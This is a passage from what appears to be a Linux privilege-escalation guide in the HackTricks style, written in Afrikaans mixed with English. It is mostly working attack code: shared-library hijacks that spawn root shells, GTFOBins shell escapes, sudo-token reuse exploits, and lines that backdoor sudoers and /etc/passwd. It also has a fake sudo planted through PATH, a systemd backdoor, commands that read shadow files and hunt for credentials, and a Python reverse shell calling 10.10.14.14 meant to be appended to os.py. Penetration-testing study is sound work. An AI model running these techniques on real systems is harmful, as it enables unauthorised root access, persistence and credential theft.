Stel die bogenoemde C-lêer saam in ’n shared object (.so)-lêer met:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Laastens, die uitvoering van die geaffekteerde SUID-binary behoort die exploit te aktiveer, wat moontlike stelselkompromittering moontlik maak.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nou dat ons ’n SUID binary gevind het wat ’n library laai vanaf ’n vouer waarheen ons kan skryf, kom ons skep die library in daardie vouer met die nodige naam:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
As jy ’n error kry soos
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is ’n saamgestelde lys van Unix binaries wat deur ’n aanvaller uitgebuit kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde maar vir gevalle waar jy **slegs arguments** in ’n command kan inject.

Die projek versamel wettige functions van Unix binaries wat misbruik kan word om uit restricted shells te breek, privileges te escalate of te maintain met verhoogde privileges, files oor te dra, bind en reverse shells te spawn, en die ander post-exploitation tasks te fasiliteer.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- You already have a shell as user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Die **tweede exploit** (`exploit_v2.sh`) sal `n sh shell in _/tmp_ skep **wat deur root besit word met setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Die **derde exploit** (`exploit_v3.sh`) sal **'n sudoers-lêer skep** wat **sudo-tokens ewigdurend maak en alle gebruikers toelaat om sudo te gebruik**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

As jy **skryftoestemmings** het in die vouer of op enige van die geskepte lêers binne die vouer, kan jy die binêre [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) gebruik om **’n sudo-token vir ’n gebruiker en PID** te skep.\
Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy het ’n shell as daardie gebruiker met PID 1234, kan jy **sudo-privileges verkry** sonder om die wagwoord te hoef te ken deur:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` stel op wie `sudo` kan gebruik en hoe. Hierdie lêers kan **by verstek slegs gelees word deur user root en group root**.\
**As** jy hierdie lêer kan **lees**, kan jy dalk **sommige interessante inligting bekom**, en as jy **enige lêer** kan **skryf**, sal jy in staat wees om **privileges te escalate**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
As jy kan skryf, kan jy hierdie permission abuse
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Nog ’n manier om hierdie toestemmings te misbruik:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Daar is sommige alternatiewe vir die `sudo` binary soos `doas` vir OpenBSD, onthou om sy konfigurasie by `/etc/doas.conf` te kontroleer
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

As jy weet dat ’n **gebruiker gewoonlik aan ’n masjien koppel en `sudo` gebruik** om voorregte te verhoog en jy het ’n shell binne daardie gebruiker se konteks gekry, kan jy **’n nuwe sudo executable skep** wat jou code as root sal uitvoer en dan die gebruiker se command. Daarna, **wysig die $PATH** van die gebruiker se konteks (byvoorbeeld deur die nuwe path in .bash_profile by te voeg) sodat wanneer die gebruiker sudo uitvoer, jou sudo executable uitgevoer word.

Let daarop dat as die gebruiker ’n ander shell gebruik (nie bash nie), jy ander files sal moet wysig om die nuwe path by te voeg. Byvoorbeeld[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan nog ’n voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Of hardloop iets soos:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Die lêer `/etc/ld.so.conf` dui aan **waar die gelaaide konfigurasielêers vandaan kom**. Tipies bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasielêers van `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasielêers **wys na ander dopgehou** waar **libraries** **gesoek** gaan word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel na libraries binne `/usr/local/lib` sal soek**.

As ’n gebruiker om een of ander rede **skryftoestemmings het** op enige van die paaie wat aangedui word: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige gids binne die config file in `/etc/ld.so.conf.d/*.conf`, kan hy moontlik privileges escalate.\
Kyk na **hoe om hierdie misconfiguration uit te buit** op die volgende bladsy:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Deur die lib na `/var/tmp/flag15/` te kopieer, sal dit deur die program op hierdie plek gebruik word soos gespesifiseer in die `RPATH`-veranderlike.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Skep dan ’n kwaadwillige library in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities bied ’n **substel van die beskikbare root-privileges aan ’n proses**. Dit breek effektief root-**privileges op in kleiner en duidelike eenhede**. Elkeen van hierdie eenhede kan dan onafhanklik aan prosesse toegeken word. Op dié manier word die volle stel privileges verminder, wat die risiko van exploitation verlaag.\
Lees die volgende bladsy om **meer te leer oor capabilities en hoe om hulle te abuse**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In ’n directory impliseer die **bit vir "execute"** dat die betrokke user in die folder in kan "**cd**".\
Die **"read"** bit impliseer dat die user die **files** kan **list**, en die **"write"** bit impliseer dat die user nuwe **files** kan **delete** en **create**.

## ACLs

Access Control Lists (ACLs) verteenwoordig die sekondêre laag van diskresionêre permissions, en kan die tradisionele ugo/rwx permissions **override**. Hierdie permissions verbeter beheer oor file- of directory-toegang deur rights toe te laat of te weier aan spesifieke users wat nie die owners is nie of nie deel van die group is nie. Hierdie vlak van **granularity verseker meer presiese access management**. Verdere besonderhede kan [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux) gevind word.

**Gee** user "kali" read- en write-permissions oor ’n file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Kry** lêers met spesifieke ACLs van die stelsel:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Versteekte ACL-agterdeur op sudoers drop-ins

’n Algemene miskonfigurasie is ’n root-eienaarskap-lêer in `/etc/sudoers.d/` met modus `440` wat steeds skryftoegang aan ’n lae-regte gebruiker via ACL gee.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
As jy iets soos `user:alice:rw-` sien, kan die gebruiker ’n sudo-reël byvoeg ten spyte van beperkende modus-bisse:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Dit is 'n hoë-impak ACL persistence/privesc-pad omdat dit maklik gemis word in `ls -l`-enkele oorsigte.

## Open shell sessions

In **ou weergawes** kan jy 'n **shell**-sessie van 'n ander gebruiker (**root**) **hijack**.\
In **nuutste weergawes** sal jy net kan **connect** na screen-sessies van **jou eie gebruiker**. Nietemin, jy kan **interessante inligting** binne die sessie vind.

### screen sessions hijacking

**Lys screen-sessies**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Heg aan 'n sessie**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux-sessies hijacking

Dit was 'n probleem met **ou tmux-weergawes**. Ek kon nie 'n tmux (v2.1)-sessie wat deur root geskep is, as 'n nie-voorreg-gebruiker hijack nie.

**Lys tmux-sessies**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Koppel aan 'n sessie**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** vir 'n voorbeeld.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) tussen September 2006 en 13 Mei 2008 kan deur hierdie bug geraak word.\
Hierdie bug word veroorsaak wanneer 'n nuwe ssh key in daardie OS geskep word, aangesien **slegs 32,768 variasies moontlik was**. Dit beteken dat al die moontlikhede bereken kan word en **deur die ssh public key te hê kan jy na die ooreenstemmende private key soek**. Jy kan die berekende moontlikhede hier vind: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Spesifiseer of password authentication toegelaat word. Die verstek is `no`.
- **PubkeyAuthentication:** Spesifiseer of public key authentication toegelaat word. Die verstek is `yes`.
- **PermitEmptyPasswords**: Wanneer password authentication toegelaat word, spesifiseer dit of die server login na accounts met leë password strings toelaat. Die verstek is `no`.

### Login control files

Hierdie files beïnvloed wie kan inlog en hoe:

- **`/etc/nologin`**: indien teenwoordig, blokkeer non-root logins en wys sy boodskap.
- **`/etc/securetty`**: beperk waar root kan inlog (TTY allowlist).
- **`/etc/motd`**: post-login banner (kan environment- of maintenance details leak).

### PermitRootLogin

Spesifiseer of root kan inlog met ssh, verstek is `no`. Moontlike values:

- `yes`: root kan login gebruik maak van password en private key
- `without-password` or `prohibit-password`: root kan slegs met 'n private key login
- `forced-commands-only`: Root kan slegs met 'n private key login en as die commands options gespesifiseer is
- `no` : no

### AuthorizedKeysFile

Spesifiseer files wat die public keys bevat wat vir user authentication gebruik kan word. Dit kan tokens soos `%h` bevat, wat vervang sal word deur die home directory. **Jy kan absolute paths aandui** (begin in `/`) of **relative paths vanaf die user's home**. Byvoorbeeld:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Daardie konfigurasie sal aandui dat as jy probeer aanmeld met die **private** key van die gebruiker "**testusername**", ssh die public key van jou key gaan vergelyk met die een(e) wat geleë is in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding laat jou toe om jou **local SSH keys** te **use** in plaas daarvan om keys** (sonder passphrases!)** op jou server te laat lê. So, jy sal via ssh **jump** na 'n **host** kan en van daar af **jump** na 'n ander **host** deur die **key** te **use** wat in jou **initial host** geleë is.

Jy moet hierdie option in `$HOME/.ssh.config` stel soos volg:
```
Host example.com
ForwardAgent yes
```
Let daarop dat as `Host` `*` is, elke keer wat die gebruiker na ’n ander masjien spring, daardie host toegang tot die keys sal hê (wat ’n sekuriteitskwessie is).

Die lêer `/etc/ssh_config` kan hierdie **options** **override** en hierdie konfigurasie toelaat of weier.\
Die lêer `/etc/sshd_config` kan ssh-agent forwarding **allow** of **denied** met die sleutelwoord `AllowAgentForwarding` (default is allow).

As jy vind dat Forward Agent in ’n omgewing gekonfigureer is, lees die volgende page as **jy dit dalk kan abuse om privileges te escalate**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Lêers

### Profiles files

Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **scripts wat uitgevoer word wanneer ’n user ’n nuwe shell run**. Daarom, as jy enige van hulle kan **write of modify, kan jy privileges escalate**.
```bash
ls -l /etc/profile /etc/profile.d/
```
If enige vreemde profielscript gevind word, moet jy dit vir **sensitiewe besonderhede** nagaan.

### Passwd/Shadow Files

Afhangende van die OS kan die `/etc/passwd` en `/etc/shadow` lêers ’n ander naam gebruik, of daar kan ’n rugsteun wees. Daarom word dit aanbeveel om **almal van hulle te vind** en **na te gaan of jy hulle kan lees** om te sien **of daar hashes** binne die lêers is:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In sommige gevalle kan jy **password hashes** binne die `/etc/passwd`-lêer (of ekwivalent) vind
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Skryfbare /etc/passwd

Eers, genereer 'n wagwoord met een van die volgende opdragte.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Voeg dan die gebruiker `hacker` by en voeg die gegenereerde wagwoord by.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su` command met `hacker:hacker` gebruik

Alternatiewelik kan jy die volgende lyne gebruik om ’n dummy user sonder ’n password by te voeg.\
WARNING: jy kan die huidige security van die machine verminder.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
LET WEL: In BSD-platforms is `/etc/passwd` geleë by `/etc/pwd.db` en `/etc/master.passwd`, ook is `/etc/shadow` hernoem na `/etc/spwd.db`.

Jy behoort te kyk of jy in sommige sensitiewe lêers kan **skryf**. Byvoorbeeld, kan jy skryf na ’n **service configuration file**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Byvoorbeeld, as die masjien 'n **tomcat**-bediener laat loop en jy kan die **Tomcat service configuration file inside /etc/systemd/** wysig, dan kan jy die lyne wysig:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Jou backdoor sal uitgevoer word die volgende keer dat tomcat begin word.

### Check Folders

Die volgende folders kan backups of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Waarskynlik sal jy nie die laaste een kan lees nie, maar probeer)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Weird Location/Owned lêers
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Gewysigde lêers in die laaste minute
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-lêers
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteekte lêers
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-lêers**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rugsteun**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekende lêers wat wagwoorde bevat

Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), dit soek vir **verskeie moontlike lêers wat wagwoorde kan bevat**.\
**Nog ’n interessante tool** wat jy kan gebruik om dit te doen is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) wat ’n open source application is wat gebruik word om baie wagwoorde te herwin wat op ’n plaaslike rekenaar gestoor is vir Windows, Linux & Mac.

### Logs

As jy logs kan lees, kan jy dalk **interessante/vertroulike inligting daarin vind**. Hoe vreemder die log is, hoe interessanter sal dit wees (waarskynlik).\
Ook kan sommige "**bad**" gekonfigureerde (backdoored?) **audit logs** jou toelaat om **wagwoorde op te neem** binne audit logs soos verduidelik in hierdie post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Om **logs te lees** sal die groep [**adm**](interesting-groups-linux-pe/index.html#adm-group) baie nuttig wees.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Jy moet ook kyk vir lêers wat die woord "**password**" in hul **naam** of binne die **inhoud** bevat, en ook kyk vir IPs en emails binne logs, of hashes regexps.\
Ek gaan nie hier lys hoe om dit alles te doen nie, maar as jy belangstel kan jy die laaste checks wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer, nagaan.

## Writable files

### Python library hijacking

As jy weet van **waar** 'n python script uitgevoer gaan word en jy **kan binne** daardie folder skryf of jy **kan python libraries modify**, kan jy die OS library modify en dit backdoor (as jy kan skryf waar die python script uitgevoer gaan word, copy and paste die os.py library).

Om die library te **backdoor** voeg net aan die einde van die os.py library die volgende line by (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitasie

’n Kwesbaarheid in `logrotate` laat gebruikers met **skryfpermissies** op ’n loglêer of sy ouer-gidse moontlik toe om verhoogde voorregte te verkry. Dit is omdat `logrotate`, wat dikwels as **root** loop, gemanipuleer kan word om arbitrêre lêers uit te voer, veral in gidse soos _**/etc/bash_completion.d/**_. Dit is belangrik om nie net permissies in _/var/log_ te kontroleer nie, maar ook in enige gids waar logrotasie toegepas word.

> [!TIP]
> Hierdie kwesbaarheid raak `logrotate` weergawe `3.18.0` en ouer

Meer gedetailleerde inligting oor die kwesbaarheid kan op hierdie bladsy gevind word: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Jy kan hierdie kwesbaarheid met [**logrotten**](https://github.com/whotwagner/logrotten) uitbuit.

Hierdie kwesbaarheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so wanneer jy ook al vind dat jy logs kan wysig, kyk wie daardie logs bestuur en kyk of jy voorregte kan verhoog deur die logs met symlinks te vervang.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Kwetsbaarheidsverwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

As ’n gebruiker om watter rede ook al in staat is om ’n `ifcf-<whatever>`-script na _/etc/sysconfig/network-scripts_ te **skryf** of ’n bestaande een te **verander**, dan is jou **system pwned**.

Netwerkskripte, byvoorbeeld _ifcg-eth0_, word vir netwerkverbindings gebruik. Hulle lyk presies soos .INI-lêers. Hulle word egter op Linux deur Network Manager (dispatcher.d) \~gesource\~.

In my geval word die `NAME=`-attribuut in hierdie netwerkskripte nie korrek hanteer nie. As jy **wit-/blanko spasies in die naam** het, probeer die system om die deel ná die wit-/blanko spasie uit te voer. Dit beteken dat **alles ná die eerste blanko spasie as root uitgevoer word**.

Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Let op die leë spasie tussen Network en /bin/id_)

### **init, init.d, systemd, and rc.d**

Die gids `/etc/init.d` is die tuiste van **scripts** vir System V init (SysVinit), die **klassieke Linux service management system**. Dit sluit scripts in om services te `start`, `stop`, `restart`, en soms `reload`. Hierdie kan direk uitgevoer word of deur simboliese skakels wat in `/etc/rc?.d/` gevind word. ’n Alternatiewe pad in Redhat systems is `/etc/rc.d/init.d`.

Aan die ander kant is `/etc/init` geassosieer met **Upstart**, ’n nuwer **service management** wat deur Ubuntu ingestel is, en gebruik konfigurasielêers vir service management take. Ten spyte van die oorgang na Upstart, word SysVinit scripts steeds saam met Upstart konfigurasies gebruik weens ’n compatibility layer in Upstart.

**systemd** verskyn as ’n moderne initialization en service manager, en bied gevorderde kenmerke soos on-demand daemon starting, automount management, en system state snapshots. Dit organiseer lêers in `/usr/lib/systemd/` vir distribution packages en `/etc/systemd/system/` vir administrator modifications, wat die system administration process stroomlyn.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hook gewoonlik ’n syscall om privileged kernel functionality aan ’n userspace manager bloot te stel. Swak manager authentication (bv. signature checks gebaseer op FD-order of swak password schemes) kan ’n local app in staat stel om die manager te impersonate en na root te escalate op toestelle wat reeds rooted is. Leer meer en sien exploitation details hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gedrewe service discovery in VMware Tools/Aria Operations kan ’n binary path uit process command lines onttrek en dit met -v binne ’n privileged context uitvoer. Permissive patterns (bv. deur \S te gebruik) kan attacker-staged listeners in writable locations (bv. /tmp/httpd) match, wat lei tot execution as root (CWE-426 Untrusted Search Path).

Leer meer en sien ’n generalized pattern wat op ander discovery/monitoring stacks van toepassing is hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Beste tool om na Linux local privilege escalation vectors te kyk:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
